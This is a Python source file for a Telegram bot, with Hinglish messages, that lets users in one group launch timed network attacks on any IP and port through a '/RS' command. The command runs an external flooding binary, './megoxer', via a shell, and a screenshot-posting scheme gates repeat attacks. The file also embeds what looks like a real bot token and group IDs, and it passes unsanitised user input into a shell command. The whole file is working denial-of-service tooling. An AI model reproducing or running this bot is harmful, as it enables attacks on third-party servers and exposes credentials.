import telebot
import datetime
import time
import subprocess
import threading

# ‚úÖ TELEGRAM BOT TOKEN
bot = telebot.TeleBot('8111473127:AAERRgnT8TW3fAw_cf_E2FM5zD8j4ae10k8')

# ‚úÖ GROUP & CHANNEL SETTINGS
GROUP_ID = "-1002369239894"
SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
ADMINS = [7129010361]

# ‚úÖ GLOBAL VARIABLES
active_attacks = {}  # ‡§Ö‡§ü‡•à‡§ï ‡§∏‡•ç‡§ü‡•á‡§ü‡§∏ ‡§ü‡•ç‡§∞‡•à‡§ï ‡§ï‡§∞‡•á‡§ó‡§æ
verified_users = set()  # ‡§µ‡•á‡§∞‡§ø‡§´‡§ø‡§ï‡•á‡§∂‡§® ‡§™‡§æ‡§∏ ‡§ï‡§∞‡§®‡•á ‡§µ‡§æ‡§≤‡•á ‡§Ø‡•Ç‡§ú‡§∞‡•ç‡§∏
user_attack_count = {}

# ‚úÖ CHECK IF USER IS IN CHANNEL
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(SCREENSHOT_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# ‚úÖ HANDLE ATTACK COMMAND
@bot.message_handler(commands=['RS'])
def handle_attack(message):
    user_id = message.from_user.id
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "üö´ **YE BOT SIRF GROUP ME CHALEGA!** ‚ùå")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"‚ùó **PEHLE CHANNEL JOIN KARO!** {SCREENSHOT_CHANNEL}")
        return

    if user_id in active_attacks:
        bot.reply_to(message, "‚ö†Ô∏è **EK TIME MAIN 1 HI ATTACK ALLOWED HAI!**\nüëâ **PURANA KHATAM HONE DO! `/check` KARO!**")
        return

    if user_id not in verified_users:
        bot.reply_to(message, "üö´ **PEHLE PURANE ATTACK KA SCREENSHOT BHEJ, TABHI NAYA ATTACK LAGEGA!**")
        return

    if len(command) != 4:
        bot.reply_to(message, "‚ö†Ô∏è **USAGE:** `/RS <IP> <PORT> <TIME>`")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "‚ùå **PORT AUR TIME NUMBER HONE CHAHIYE!**")
        return

    if time_duration > 120:
        bot.reply_to(message, "üö´ **120S SE ZYADA ALLOWED NAHI HAI!**")
        return

    start_time = datetime.datetime.now()
    end_time = start_time + datetime.timedelta(seconds=time_duration)
    active_attacks[user_id] = [(target, port, end_time)]

    bot.send_message(
        message.chat.id,
        f"üî• **ATTACK DETAILS** üî•\n\n"
        f"üë§ **USER:** `{user_id}`\n"
        f"üéØ **TARGET:** `{target}`\n"
        f"üìç **PORT:** `{port}`\n"
        f"‚è≥ **DURATION:** `{time_duration} SECONDS`\n"
        f"üïí **START TIME:** `{start_time.strftime('%H:%M:%S')}`\n"
        f"üöÄ **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n\n"
        f"‚ö†Ô∏è **ATTACK CHALU HAI! `/check` KARKE STATUS DEKHO!**",
        parse_mode="Markdown"
    )

    # ‚úÖ Attack Execution Function
    def attack_execution():
        try:
            subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
        except subprocess.CalledProcessError:
            bot.reply_to(message, "‚ùå **ATTACK FAIL HO GAYA!**")
        finally:
            bot.send_message(
                message.chat.id,
                "‚úÖ **ATTACK KHATAM HO GAYA!** üéØ\n"
                "üì∏ **AB TURANT SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI LAGEGA!**",
                parse_mode="Markdown"
            )
            verified_users.discard(user_id)  # ‚úÖ ‡§µ‡•á‡§∞‡§ø‡§´‡§ø‡§ï‡•á‡§∂‡§® ‡§π‡§ü‡§æ‡§ì
            del active_attacks[user_id]  # ‚úÖ ‡§Ö‡§ü‡•à‡§ï ‡§ñ‡§§‡•ç‡§Æ ‡§π‡•ã‡§§‡•á ‡§π‡•Ä ‡§°‡•á‡§ü‡§æ ‡§ï‡•ç‡§≤‡§ø‡§Ø‡§∞

    threading.Thread(target=attack_execution).start()

# ‚úÖ SCREENSHOT VERIFICATION SYSTEM
@bot.message_handler(content_types=['photo'])
def verify_screenshot(message):
    user_id = message.from_user.id

    if user_id not in active_attacks:
        bot.reply_to(message, "‚ùå **TERE KOI ACTIVE ATTACK NAHI MILA! SCREENSHOT FALTU NA BHEJ!**")
        return

    # ‚úÖ SCREENSHOT CHANNEL FORWARD
    file_id = message.photo[-1].file_id
    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=f"üì∏ **VERIFIED SCREENSHOT FROM:** `{user_id}`")

    verified_users.add(user_id)  # ‚úÖ ‡§Ø‡•Ç‡§ú‡§∞ ‡§ï‡•ã ‡§µ‡•á‡§∞‡§ø‡§´‡§æ‡§á‡§° ‡§≤‡§ø‡§∏‡•ç‡§ü ‡§Æ‡•á‡§Ç ‡§ê‡§° ‡§ï‡§∞ ‡§¶‡§ø‡§Ø‡§æ
    bot.reply_to(message, "‚úÖ **SCREENSHOT VERIFY HO GAYA! AB TU NEXT ATTACK KAR SAKTA HAI!**")

# ‚úÖ ATTACK STATS COMMAND
@bot.message_handler(commands=['check'])
def attack_stats(message):
    user_id = message.from_user.id
    now = datetime.datetime.now()

    for user in list(active_attacks.keys()):
        active_attacks[user] = [attack for attack in active_attacks[user] if attack[2] > now]
        if not active_attacks[user]:
            del active_attacks[user]

    if not active_attacks:
        bot.reply_to(message, "üìä **FILHAAL KOI ACTIVE ATTACK NAHI CHAL RAHA!** ‚ùå")
        return

    stats_message = "üìä **ACTIVE ATTACKS:**\n\n"
    for user, attacks in active_attacks.items():
        stats_message += f"üë§ **USER ID:** `{user}`\n"
        for target, port, end_time in attacks:
            remaining_time = (end_time - now).total_seconds()
            stats_message += (
                f"üéØ **TARGET:** `{target}`\n"
                f"üìç **PORT:** `{port}`\n"
                f"‚è≥ **ENDS IN:** `{int(remaining_time)}s`\n"
                f"üïí **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n\n"
            )

    bot.reply_to(message, stats_message, parse_mode="Markdown")

# ‚úÖ ADMIN RESTART COMMAND
@bot.message_handler(commands=['restart'])
def restart_bot(message):
    if message.from_user.id in ADMINS:
        bot.send_message(message.chat.id, "‚ôªÔ∏è BOT RESTART HO RAHA HAI...")
        time.sleep(1)
        subprocess.run("python3 m.py", shell=True)
    else:
        bot.reply_to(message, "üö´ SIRF ADMIN HI RESTART KAR SAKTA HAI!")

# ‚úÖ START POLLING
bot.polling(none_stop=True)